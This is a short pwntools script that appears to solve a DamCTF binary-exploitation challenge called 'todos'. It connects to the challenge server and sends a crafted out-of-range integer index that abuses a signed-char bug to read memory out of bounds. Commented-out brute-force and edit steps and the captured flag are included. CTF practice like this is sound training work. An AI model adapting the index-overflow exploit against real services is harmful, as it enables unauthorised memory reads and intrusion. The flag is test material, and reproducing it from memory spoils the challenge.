from pwn import *

elf_path = './todos'
qemu_args = ['-L', '/usr/arm-linux-gnueabihf/']
#p = process(['qemu-arm'] + qemu_args + [elf_path])

p = remote("charful.chals.damctf.xyz", 30128)
for i in range(1):
	p.sendlineafter(b"to do? ", f"{1}".encode())
	p.sendlineafter(b"TODO: ", f"{i}".encode() * 8)

'''
>>> hex(0x640A0 - 0x63238)
'0xe68'
>>> hex(0xe68//56)
'0x41'
>>> -0x41
-65
>>>
'''

p.sendlineafter(b"to do? ", f"{2}".encode())
p.sendlineafter(b"to print? ", f"{0x7fffffff00000000 + -65}".encode())

'''
for i in range(0, 0x100):
	p.sendlineafter(b"to do? ", f"{2}".encode())
	p.sendlineafter(b"to print? ", f"{0x7fffffff0FFFFFF00 + i}".encode())
	if(p.recv(7) != b"Invalid"):
		break
'''
'''
p.sendlineafter(b"to do? ", f"{4}".encode())
p.sendlineafter(b"to edit? ", f"{0x7fffffff00000000 + -65}".encode())
p.sendlineafter(b"name: ", b"A" * 8)
'''

p.interactive()
#dam{dont_you_love_to_play_with_fun_signed_chars}
